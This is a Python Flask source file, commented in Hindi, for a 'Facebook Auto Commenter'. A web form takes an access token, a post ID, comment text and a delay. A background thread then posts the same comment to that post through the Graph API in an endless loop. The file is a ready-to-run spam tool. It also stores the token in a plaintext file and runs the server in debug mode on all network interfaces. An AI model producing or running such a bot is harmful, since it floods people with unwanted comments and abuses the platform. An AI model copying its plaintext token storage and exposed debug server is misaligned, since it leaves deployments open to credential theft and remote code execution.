from flask import Flask, request, render_template_string
import os
import threading
import time
import requests

app = Flask(__name__)

# Data Directory
DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)

TOKEN_FILE = os.path.join(DATA_DIR, "token.txt")
POST_FILE = os.path.join(DATA_DIR, "post.txt")
COMMENT_FILE = os.path.join(DATA_DIR, "comment.txt")
TIME_FILE = os.path.join(DATA_DIR, "time.txt")

# Data Save करने की Function
def save_data(token, post_id, comment_text, delay):
    with open(TOKEN_FILE, "w") as f:
        f.write(token.strip())
    with open(POST_FILE, "w") as f:
        f.write(post_id.strip())
    with open(COMMENT_FILE, "w") as f:
        f.write(comment_text.strip())
    with open(TIME_FILE, "w") as f:
        f.write(str(delay))

# Function जो Auto Comment करेगा
def post_comments():
    try:
        with open(TOKEN_FILE, "r") as f:
            token = f.read().strip()
        with open(POST_FILE, "r") as f:
            post_id = f.read().strip()
        with open(COMMENT_FILE, "r") as f:
            comment_text = f.read().strip()
        with open(TIME_FILE, "r") as f:
            delay = int(f.read().strip())

        if not (token and post_id and comment_text):
            print("[!] जरूरी Data नहीं मिला।")
            return

        url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
        headers = {'User-Agent': 'Mozilla/5.0'}
        payload = {'access_token': token, 'message': comment_text}

        while True:
            response = requests.post(url, json=payload, headers=headers)
            if response.ok:
                print(f"[+] Comment Post किया गया: {comment_text}")
            else:
                print(f"[x] Error: {response.status_code} {response.text}")

            time.sleep(delay)

    except Exception as e:
        print(f"[!] Error: {e}")

# HTML Form Template
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Auto Commenter</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; text-align: center; margin: 0; padding: 0; }
        .container { width: 100%; max-width: 400px; background: white; padding: 20px; margin: 50px auto; border-radius: 10px; box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1); }
        h2 { margin-bottom: 20px; color: #333; }
        form { display: flex; flex-direction: column; }
        label { text-align: left; font-weight: bold; margin-top: 10px; }
        input, textarea { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 5px; }
        button { margin-top: 20px; padding: 10px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background: #218838; }
        .message { color: green; font-weight: bold; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>💬 Facebook Auto Commenter</h2>
        <form action="/" method="post">
            <label for="token">🔑 Access Token:</label>
            <input type="text" id="token" name="token" required>

            <label for="post_id">📝 Post ID:</label>
            <input type="text" id="post_id" name="post_id" required>

            <label for="comment_text">💬 Comment:</label>
            <textarea id="comment_text" name="comment_text" rows="4" required></textarea>

            <label for="delay">⏳ Delay (Seconds):</label>
            <input type="number" id="delay" name="delay" value="5" min="1">

            <button type="submit">📤 Start Commenting</button>
        </form>
        <p id="status" class="message"></p>
    </div>
</body>
</html>
"""

# Flask Route जो Form Show करेगा
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        token = request.form.get("token")
        post_id = request.form.get("post_id")
        comment_text = request.form.get("comment_text")
        delay = request.form.get("delay", 5)

        if token and post_id and comment_text:
            save_data(token, post_id, comment_text, delay)
            threading.Thread(target=post_comments, daemon=True).start()

    return render_template_string(HTML_TEMPLATE)

# Flask Server Start
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 3000))
    app.run(host='0.0.0.0', port=port, debug=True)
